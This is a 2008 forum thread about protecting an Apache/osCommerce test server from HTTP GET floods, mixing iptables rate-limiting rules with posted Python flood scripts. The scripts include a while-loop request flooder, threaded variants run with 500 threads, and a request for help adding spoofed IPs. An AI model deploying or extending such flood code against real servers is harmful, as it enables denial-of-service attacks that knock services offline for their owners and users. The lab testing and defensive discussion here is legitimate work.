---
title: "http flood"
date: 2008-08-18
forum: Security
---

### Post by ub007 on 2008-08-18
Hi,

I have setup a test intranet with 10 ubuntu machines,installed LAMP server and osCommerce shopping portal on my server.I tried to load test the Apache webserver by sending large number of HTTP requests using a python script.It took only 3 minutes to bring down the server;the attack was launched using 3 client PCs.I also tried syn floods and icmp floods,but the kernel  mitigated these attacks,however the http get flood crippled the server.....I was wondering what are the best security measures against this sort of attack.
ip-tables & tarpitting comes to mind.....but they have their limitations.....tarpitting doesnt filter the attack,it only delays it and also creates overload on the cpu.iptables are effective,but again a large http ddos attack would be hard to mitigate...... Could anyone help me out with this...

Thanks & Regards,
David

---

### Post by Drezard on 2008-08-19
Hi,

Im no Ubuntu Security legend but, I have my CCSP. Denial of Service attacks (like HTTP floods) are quite unfriendly and have no real way of protecting them (currently, maybe future we might). The best way is to get your server up and running AFTER an attack as fast as possible. The only other things I can think of would be, is your server low spec? Maybe bump up the processor and memory of it, thats about the only thing you can do. Thats about all you can do. 

Daniel

---

### Post by cdenley on 2008-08-19
How about something like this
```

sudo iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW -m recent --set --name apache
sudo iptables -A INPUT -i eth0 -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 60 --hitcount 8 --rttl --name apache -j DROP

```
This should limit the number of new connections that can be made. Of course, if the attacker re-used the same existing connection(s), it wouldn't help.

I think I will play around with apache to see if any configuration options can block this or at least minimize it. Can you post your python script?

---

### Post by cdenley on 2008-08-19
The iptables solution seems to work. Unless I find a test script that doesn't get caught by those rules, I'm satisfied with that solution. I couldn't crash my test server, but I only used one attacking computer. I did notice, though, that the attacker stopped getting responses because the packets were being dropped, so the threat should have been eliminated fairly quickly.

attack script
```

#!/usr/bin/python
import httplib, urllib
conn = httplib.HTTPConnection('192.168.0.31')
count=0
while(True):
    conn.request("GET", "/");
    resp=conn.getresponse();
    resp.read();
    count+=1
    if(count%100==0):
        print str(count)+" requests"

```

---

### Post by qstraza on 2008-08-19
hej, i got this rules from a friend and i need some help understanding it, can some one be so kind to do that ;)

```

iptables -N www
iptables -I OUTPUT -m owner --uid-owner www-data -j www
iptables -A www -p tcp -m tcp --sport 80 -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A www -j DROP

```

and another thing, since this rule, www-data cannot use ctorrent (cant connect), can someone give me some workaround (keeping these rules)

thanks

---

### Post by cdenley on 2008-08-19
It looks like that will prevent www-data from creating any new connections. Any outgoing data from that user will be dropped unless it is from an established connection and using port 80. Of course www-data can't connect to anything, that's the point.

---

### Post by qstraza on 2008-08-19
Thanks for explaining, i need to find some usefull tutorial to learn iptables, which is very very usefull.

I added that rule of yours, thanks again;>

---

### Post by ub007 on 2008-08-19
> I think I will play around with apache to see if any configuration options can block this or at least minimize it. Can you post your python script? 

Yes you can configure apache to stop the attacks coming from a single PC,but i guess its difficult to stop it when many of them are involved.Infact i changed the apache configuration to help simulate this attack as i didnt have the resources for a ddos situation.heres my code..its similar to yours....but i may spawn the threads to start at delayed intervals (instead of a while true loop)and this if combined with many systems would be hard to mitigate.....



       def start(self, threads=1, interval=0, rampup=1):

       for i in range(threads):
            gap = (i * (float(rampup) / float(threads)))
            time.sleep(gap)

         agent = LoadAg(interval, self.url)

        def attack(self, url):
        conn = httplib.HTTPConnection(url)
        try:
            conn.request('GET', url)
            body = conn.getresponse().read()
            return True
        except:
            print 'failed request'
            return False


i created 500 threads of this instance.

Another variant that i used
      
           def attack(self, url):
           try:
            instream = urllib.urlopen(url)
            page = instream.read()
            instream.close()

            links = re.findall(r'href=\"[^\"]+\"', page)
            #temp = set()
            #for x in links:
                #x = x[6:-1]    # strip off 'href="' and '"'
                #if x.startswith('http://'):
                   # temp.add(x)
            #links = list(temp)
            #links.sort()
                     
            return True

this would spider the website.spawned 500 threads of this as well

I used another snippet for downloading files and logging in to the portal.....

i wish to introduce virtual IPs into this attack code,that will be a stronger test tool than sending the http request from a single IP.....but wonder whether i would have the time to accomplish that,the deadline for my dissertation is fast approaching,any help is very much appreciated,  :)

---

